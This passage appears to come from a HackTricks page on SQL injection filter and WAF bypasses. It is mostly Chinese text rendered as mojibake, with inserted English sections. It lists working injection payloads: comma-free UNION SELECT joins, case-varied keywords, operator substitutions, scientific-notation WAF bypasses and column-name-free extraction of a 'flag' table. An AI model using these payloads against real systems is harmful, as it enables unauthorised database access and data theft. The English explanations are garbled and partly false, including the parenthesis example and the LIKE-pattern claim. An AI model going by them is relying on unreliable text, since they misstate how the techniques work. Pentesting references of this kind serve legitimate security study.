The idea behind this technique is to enclose the malicious payload within parentheses, effectively changing the structure of the SQL query and bypassing the filters. By doing so, the whitespace characters can be preserved while still injecting the payload.

Consider the following example:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```

To bypass the filters, we can enclose the payload within parentheses:

```sql
SELECT * FROM users WHERE username = 'admin' AND (password = 'password')
```

In this example, the parentheses effectively change the structure of the query, allowing the payload to be injected without removing any whitespace characters.

It's important to note that this technique may not work in all scenarios, as it depends on the specific implementation of the input validation filters. Additionally, it's crucial to thoroughly test the application to ensure that the payload is being injected correctly and not causing any unintended consequences.

## Conclusion

When faced with strict input validation or other restrictions that prevent the removal of whitespace characters, using parentheses to enclose the payload can be an effective technique to bypass filters and successfully inject SQL payloads. However, it's important to understand the limitations of this technique and thoroughly test its effectiveness in each specific scenario.
```sql
?id=(1)and(1)=(1)--
```
### æ— é€—å·ç»•è¿‡

æ— é€—å·ç»•è¿‡ - ä½¿ç”¨OFFSETã€FROMå’ŒJOINè¿›è¡Œç»•è¿‡
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### é€šç”¨ç»•è¿‡æ–¹æ³•

é»‘åå•ä½¿ç”¨å…³é”®è¯ - ä½¿ç”¨å¤§å†™/å°å†™ç»•è¿‡
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
## Blacklist using keywords case insensitive - bypass using an equivalent operator

### Introduction

In some cases, web applications implement a blacklist to prevent certain keywords from being used in user input. This is often done to mitigate SQL injection attacks. However, if the blacklist is implemented in a case-insensitive manner, it can be bypassed using an equivalent operator.

### Bypassing a Case-Insensitive Blacklist

To bypass a case-insensitive blacklist, you can use an equivalent operator that the blacklist does not account for. One common example is the "LIKE" operator, which is used for pattern matching in SQL queries.

The "LIKE" operator allows the use of wildcard characters, such as "%" and "_", to match any character or a specific character, respectively. By using the "LIKE" operator, you can construct a query that bypasses the case-insensitive blacklist.

### Example

Suppose a web application has a case-insensitive blacklist that prevents the use of the keyword "admin" in user input. The application uses the following query to retrieve user information from the database:

```sql
SELECT * FROM users WHERE username = 'input';
```

To bypass the blacklist, you can use the "LIKE" operator to match the keyword "admin" in a case-insensitive manner. The following payload can be used:

```sql
SELECT * FROM users WHERE username LIKE '%a%dm%in%';
```

This payload will match any username that contains the letters "a", "d", "m", and "in" in any order, effectively bypassing the blacklist.

### Conclusion

When a web application implements a case-insensitive blacklist to prevent certain keywords, it is possible to bypass it using an equivalent operator like the "LIKE" operator. By understanding how the blacklist is implemented and using the appropriate bypass technique, you can successfully exploit SQL injection vulnerabilities.
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### ç§‘å­¦è®¡æ•°æ³•WAFç»•è¿‡

æ‚¨å¯ä»¥åœ¨[gosecureåšå®¢](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)ä¸­æ‰¾åˆ°æ›´è¯¦ç»†çš„è§£é‡Šã€‚\
åŸºæœ¬ä¸Šï¼Œæ‚¨å¯ä»¥ä»¥æ„æƒ³ä¸åˆ°çš„æ–¹å¼ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•æ¥ç»•è¿‡WAFï¼š
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### ç»•è¿‡åˆ—åé™åˆ¶

é¦–å…ˆï¼Œæ³¨æ„å¦‚æœ**åŸå§‹æŸ¥è¯¢å’Œä½ æƒ³ä»ä¸­æå–æ ‡å¿—çš„è¡¨å…·æœ‰ç›¸åŒæ•°é‡çš„åˆ—**ï¼Œä½ å¯ä»¥ç®€å•åœ°æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š`0 UNION SELECT * FROM flag`

å¯ä»¥é€šè¿‡ä»¥ä¸‹æŸ¥è¯¢**è®¿é—®è¡¨çš„ç¬¬ä¸‰åˆ—è€Œä¸ä½¿ç”¨åˆ—å**ï¼š`SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`ï¼Œæ‰€ä»¥åœ¨SQLæ³¨å…¥ä¸­ï¼Œå®ƒçœ‹èµ·æ¥åƒæ˜¯è¿™æ ·ï¼š
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
æˆ–è€…ä½¿ç”¨**é€—å·ç»•è¿‡**ï¼š
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
è¿™ä¸ªæŠ€å·§æ¥è‡ª[https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### WAFç»•è¿‡å»ºè®®å·¥å…·

{% embed url="https://github.com/m4ll0k/Atlas" %}

## å…¶ä»–æŒ‡å—

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## æš´åŠ›ç ´è§£æ£€æµ‹åˆ—è¡¨

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) æ˜¯è¥¿ç­ç‰™æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æ¬§æ´²æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­ç‚¹äº¤æµå¹³å°ã€‚

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ç½‘ç»œå®‰å…¨å…¬å¸å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­å®£ä¼ ä½ çš„å…¬å¸å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTrickså—ï¼Ÿè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
